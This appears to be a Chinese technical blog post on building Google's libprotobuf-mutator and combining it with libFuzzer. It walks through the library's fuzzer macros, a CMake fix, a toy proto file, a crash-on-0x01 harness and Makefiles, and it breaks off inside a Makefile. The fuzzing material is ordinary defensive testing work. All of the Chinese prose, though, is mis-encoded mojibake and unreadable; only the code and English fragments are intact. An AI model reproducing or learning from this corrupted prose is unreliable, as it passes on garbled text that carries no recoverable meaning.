<p>ç”±äºéœ€è¦ä»Googleä¸‹è½½ä¸€äº›æºç ï¼Œæ‰€ä»¥åœ¨ <code>ninja check</code> çš„æ—¶å€™éœ€è¦æŒ‚ä¸Šä»£ç†ï¼Œç»“æœç¼–è¯‘å‡ºé”™äº†ï¼Œæ‰¾ä¸åˆ° <code>libxml2.a</code>ï¼Œæ’æŸ¥ä¸€ä¸‹ç¼–è¯‘å‚æ•°ï¼Œå‘ç°éœ€è¦æ·»åŠ ç¼–è¯‘é™æ€åº“çš„å‚æ•°</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/cmake/external/libxml2.cmake b/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="comment">index c00ace2..a944fab 100644</span></span><br><span class="line"><span class="comment">--- a/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="comment">+++ b/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span> ExternalProject_Add($&#123;LIBXML2_TARGET&#125;</span><br><span class="line">     UPDATE_COMMAND &quot;&quot;</span><br><span class="line">     CONFIGURE_COMMAND $&#123;LIBXML2_SRC_DIR&#125;/autogen.sh --without-python</span><br><span class="line">                                                     --prefix=$&#123;LIBXML2_INSTALL_DIR&#125;</span><br><span class="line"><span class="addition">+                                                    --enable-static=yes</span></span><br><span class="line">                                                     CC=$&#123;CMAKE_C_COMPILER&#125;</span><br><span class="line">                                                     CXX=$&#123;CMAKE_CXX_COMPILER&#125;</span><br><span class="line">                                                     CFLAGS=$&#123;LIBXML2_CFLAGS&#125;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åå¯ä»¥æ­£å¸¸é€šè¿‡ <code>ninja check</code> å‘½ä»¤çš„æ‰€æœ‰æ£€æŸ¥ã€‚é»˜è®¤æƒ…å†µä¸‹ <code>ninja install</code> ä¼šå®‰è£…åˆ° &#x2F;usr&#x2F;local ç›®å½•ï¼Œå› ä¸ºè€ƒè™‘åˆ°åç»­éœ€è¦ç»™ <code>afl+</code>ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ä¸‹çš„å‘½ä»¤é‡æ–° cmake ä¸€ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug</span><br></pre></td></tr></table></figure>
<h3 id="libprotobuf-mutator-ä»£ç å®ç°"><a href="#libprotobuf-mutator-ä»£ç å®ç°" class="headerlink" title="libprotobuf-mutator ä»£ç å®ç°"></a>libprotobuf-mutator ä»£ç å®ç°</h3><p>libfuzzer_macro.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto)                 \</span></span><br><span class="line"><span class="meta">  extern <span class="string">&quot;C&quot;</span> int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \</span></span><br><span class="line"><span class="meta">    using protobuf_mutator::libfuzzer::LoadProtoInput;                      \</span></span><br><span class="line"><span class="meta">    Proto input;                                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (LoadProtoInput(use_binary, data, size, &amp;input))                     \</span></span><br><span class="line"><span class="meta">      TestOneProtoInput(input);                                             \</span></span><br><span class="line"><span class="meta">    return 0;                                                               \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using default</span></span><br><span class="line"><span class="comment">// serialization format. Default is text.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_PROTO_FUZZER(arg) DEFINE_TEXT_PROTO_FUZZER(arg)</span></span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using text</span></span><br><span class="line"><span class="comment">// serialization. This format is more convenient to read.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)</span></span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using binary</span></span><br><span class="line"><span class="comment">// serialization. This makes mutations faster. However often test function is</span></span><br><span class="line"><span class="comment">// significantly slower than mutator, so fuzzing rate may stay unchanged.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_BINARY_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(true, arg)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_PROTO_FUZZER_IMPL(use_binary, arg)                              \</span></span><br><span class="line"><span class="meta">  static void TestOneProtoInput(arg);                                          \</span></span><br><span class="line"><span class="meta">  using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt;             \</span></span><br><span class="line"><span class="meta">      std::function<span class="string">&lt;decltype(TestOneProtoInput)&gt;</span>::argument_type&gt;::type&gt;::type; \</span></span><br><span class="line"><span class="meta">  DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType)                \</span></span><br><span class="line"><span class="meta">  DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType)              \</span></span><br><span class="line"><span class="meta">  DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType)                \</span></span><br><span class="line"><span class="meta">  DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType)                     \</span></span><br><span class="line"><span class="meta">  static void TestOneProtoInput(arg)</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨è·¯å¾„ä¸º <code>DEFINE_PROTO_FUZZER</code> -&gt; <code>DEFINE_TEXT_PROTO_FUZZER</code> -&gt; <code>DEFINE_PROTO_FUZZER_IMPL</code> -&gt; <code>DEFINE_TEST_ONE_PROTO_INPUT_IMPL</code> -&gt; <code>LLVMFuzzerTestOneInput</code> -&gt; <code>TestOneProtoInput</code>ã€‚<br>æœ€ç»ˆè¿˜æ˜¯å®ç°äº†<code>LLVMFuzzerTestOneInput</code> libfuzzer çš„å…¥å£æ–¹æ³•ï¼Œä½¿ç”¨ macro å¯ä»¥å°‘å†™ä¸å°‘ä»£ç éå¸¸æ–¹ä¾¿ï¼Œä»è¿™é‡Œå°±å¯ä»¥çœ‹å‡º fuzz çš„ target function å¿…é¡»å’Œ <code>LLVMFuzzerTestOneInput</code> çš„å‚æ•°ç±»å‹ä¸€è‡´</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  DoSomethingInterestingWithMyAPI(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>libfuzzer_macro.cc</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LoadProtoInput</span><span class="params">(<span class="type">bool</span> binary, <span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">                    protobuf::Message* input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">GetCache</span>()-&gt;<span class="built_in">LoadIfSame</span>(data, size, input)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">auto</span> result = binary ? <span class="built_in">ParseBinaryMessage</span>(data, size, input)</span><br><span class="line">                       : <span class="built_in">ParseTextMessage</span>(data, size, input);</span><br><span class="line">  <span class="keyword">if</span> (!result) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">GetMutator</span>()-&gt;<span class="built_in">Seed</span>(size);</span><br><span class="line">  <span class="built_in">GetMutator</span>()-&gt;<span class="built_in">Fix</span>(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>LoadProtoInput</code> è¿”å› <code>true</code> æˆ–è€… <code>false</code>ï¼Œå¦‚æœè§£ææˆåŠŸï¼Œå°†è°ƒç”¨ <code>TestOneProtoInput</code>ï¼Œ<code>DEFINE_PROTO_FUZZER</code> macro å…¶å®å°±æ˜¯å†™ TestOneProtoInput çš„å®ç°ã€‚</p>
<h2 id="libprotobuf-mutator-fuzzing-learning"><a href="#libprotobuf-mutator-fuzzing-learning" class="headerlink" title="libprotobuf-mutator_fuzzing_learning"></a>libprotobuf-mutator_fuzzing_learning</h2><p>è¿™æ˜¯ github ä¸Šä¸€ä½åŒè¡Œå†™çš„å­¦ä¹  libprotobuf-mutator fuzzing çš„æ–‡ç« ï¼Œæ€»ä½“å†™çš„ä¸é”™ï¼Œä½†æ˜¯å…¶ä¸­æœ‰ä¸€äº›é”™è¯¯çš„åœ°æ–¹ï¼Œåœ¨å®è·µè¿‡ç¨‹ä¸­éƒ½è®°å½•äº†å…¶ä¸­çš„ä¿®æ”¹ã€‚</p>
<h3 id="Simple-protobuf-example"><a href="#Simple-protobuf-example" class="headerlink" title="Simple protobuf example"></a>Simple protobuf example</h3><p>æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf</a></p>
<p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ protobuf æ–‡ä»¶ï¼Œtest.proto</p>
<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">TEST</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">uint32</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ <code>protoc</code> ç¼–è¯‘ protobuf æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> genfiles  </span><br><span class="line">protoc ./test.proto --cpp_out=./genfiles</span><br></pre></td></tr></table></figure>

<p>å°†è‡ªåŠ¨ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> ./genfiles</span><br><span class="line">test.pb.cc  test.pb.h</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªæµ‹è¯•ç¨‹åº test_proto.cc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TEST t;</span><br><span class="line">    t.<span class="built_in">set_a</span>(<span class="number">101</span>);</span><br><span class="line">    t.<span class="built_in">set_b</span>(<span class="string">&quot;testtest&quot;</span>);</span><br><span class="line">    cout &lt;&lt; t.<span class="built_in">a</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; t.<span class="built_in">b</span>() &lt;&lt; endl;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>å†™ Makefile æ¥ç¼–è¯‘ <code>test_proto.cc</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CXX=clang++</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="section">test_proto: test_proto.cc <span class="variable">$(PB_SRC)</span></span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm test_proto</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œ <code>make</code> åæŠ¥é”™ .&#x2F;test.pb.h:17:2: error: This file was generated by an older version of protoc which isï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨äº† <code>-DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON</code> ä¸‹è½½äº†æ–°ç‰ˆæœ¬çš„ protobufï¼Œæ‰€ä»¥å‡ºäº†è¿™ä¸ªé”™è¯¯ã€‚åªå¥½ä½¿ç”¨ä¸‹è½½çš„ protoc é‡æ–°ç”Ÿæˆ <code>test.pb.cc</code> å’Œ <code>test.pb.h</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/code/libprotobuf-mutator/build/external.protobuf/bin/protoc ./test.proto --cpp_out=./genfiles</span><br></pre></td></tr></table></figure>

<p>è¿™æ¬¡å¯ä»¥æˆåŠŸ make äº†ï¼Œå®é™…æ‰§è¡Œçš„å‘½ä»¤æ˜¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang++ -o test_proto test_proto.cc test.pb.cc /home/henices/code/libprotobuf-mutator/build/external.protobuf//lib/libprotobufd.a \</span><br><span class="line"> -I/home/henices/code/libprotobuf-mutator/build/external.protobuf//include</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œ <code>./test_proto</code>, è¾“å‡ºå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101</span><br><span class="line">testtest</span><br></pre></td></tr></table></figure>

<h3 id="Combine-libprotobuf-mutator-with-libfuzzer"><a href="#Combine-libprotobuf-mutator-with-libfuzzer" class="headerlink" title="Combine libprotobuf-mutator with libfuzzer"></a>Combine libprotobuf-mutator with libfuzzer</h3><p>ä»£ç åœ¨ï¼š <a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer</a></p>
<p>harness.cc</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">FuzzTEST</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(data[<span class="number">0</span>] == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">        __builtin_trap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ FuzzTEST æ˜¯æˆ‘ä»¬éœ€è¦æµ‹è¯•çš„ç›®æ ‡å‡½æ•°ã€‚</p>
<p>lpm_libfuzz.cc</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">ProtoToData</span><span class="params">(<span class="type">const</span> TEST &amp;test_proto)</span> </span>&#123;</span><br><span class="line">    std::stringstream all;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;aa = test_proto.<span class="built_in">a</span>();</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;bb = test_proto.<span class="built_in">b</span>();</span><br><span class="line">    all.<span class="built_in">write</span>((<span class="type">const</span> <span class="type">char</span>*)&amp;aa, <span class="built_in">sizeof</span>(aa));</span><br><span class="line">    <span class="keyword">if</span>(bb.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        all.<span class="built_in">write</span>(bb.<span class="built_in">c_str</span>(), bb.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::string res = all.<span class="built_in">str</span>();</span><br><span class="line">    <span class="keyword">if</span> (bb.<span class="built_in">size</span>() != <span class="number">0</span> &amp;&amp; res.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// set PROTO_FUZZER_DUMP_PATH env to dump the serialized protobuf</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="type">const</span> <span class="type">char</span> *dump_path = <span class="built_in">getenv</span>(<span class="string">&quot;PROTO_FUZZER_DUMP_PATH&quot;</span>)) &#123;</span><br><span class="line">            <span class="function">std::ofstream <span class="title">of</span><span class="params">(dump_path)</span></span>;</span><br><span class="line">            of.<span class="built_in">write</span>(res.<span class="built_in">data</span>(), res.<span class="built_in">size</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">FuzzTEST</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span></span>; <span class="comment">// our customized fuzzing function</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DEFINE_PROTO_FUZZER</span>(<span class="type">const</span> TEST &amp;test_proto) &#123;</span><br><span class="line">    <span class="keyword">auto</span> s = <span class="built_in">ProtoToData</span>(test_proto); <span class="comment">// convert protobuf to raw data</span></span><br><span class="line">    <span class="built_in">FuzzTEST</span>((<span class="type">const</span> <span class="type">uint8_t</span>*)s.<span class="built_in">data</span>(), s.<span class="built_in">size</span>()); <span class="comment">// fuzz the function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨æ–‡ä»¶çš„æœ€å¼€å¤´å¯¼å…¥ <code>libfuzzer_macro.h</code>ï¼Œ åé¢å°±å¯ä»¥ä½¿ç”¨ä¸€äº›å®æ¥å†™ä»£ç äº†ï¼Œ<code>DEFINE_PROTO_FUZZER</code> æ˜¯å…³é”®çš„ fuzzer å…¥å£ã€‚ç»“æ„åŒ–å˜å¼‚éƒ¨åˆ† libprotobuf-mutator å·²ç»å®Œæˆäº†ï¼Œéœ€è¦å®ç°çš„æ˜¯ä¸€ä¸ªç”± protobuf è½¬éœ€è¦çš„æ•°æ®ç±»å‹çš„å‡½æ•°ï¼Œå¦‚ä¸Šé¢çš„ <code>ProtoToData</code></p>
<h4 id="ä»£ç ç¼–è¯‘"><a href="#ä»£ç ç¼–è¯‘" class="headerlink" title="ä»£ç ç¼–è¯‘"></a>ä»£ç ç¼–è¯‘</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_libfuzz</span><br><span class="line">CXX=clang++</span><br><span class="line">CXXFLAGS=-g -fsanitize=fuzzer,address</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(LPM_DIR)</span>/<span class="keyword">include</span></span><br><span class="line">DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for testing libprotobuf + libfuzzer</span></span><br><span class="line"><span class="comment"># compile harness first</span></span><br><span class="line"><span class="comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span></span><br><span class="line"><span class="section">harness.o: harness.cc</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -c <span class="variable">$(DFUZZ)</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: harness.o <span class="variable">$(TARGET)</span>.cc</span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PB_SRC)</span> <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span> <span class="comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm <span class="variable">$(TARGET)</span> *.o</span><br></pre></td></tr></table></figure>

<p>make åæŠ¥é”™ï¼Œæ‰¾ä¸åˆ°å¤´æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/henices/code/AFL+/external/libprotobuf-mutator/include/libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h:24:10: fatal error: &#x27;port/protobuf.h&#x27; file not found</span><br><span class="line">#include &quot;port/protobuf.h&quot;</span><br><span class="line">         ^~~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure>

<p>port&#x2F;protobuf.h  æ¥è‡ª <a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h">https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h</a>  ä¿®æ”¹ Makefile å¦‚ä¸‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_libfuzz</span><br><span class="line">CXX=clang++</span><br><span class="line">CXXFLAGS=-g -fsanitize=fuzzer,address</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span 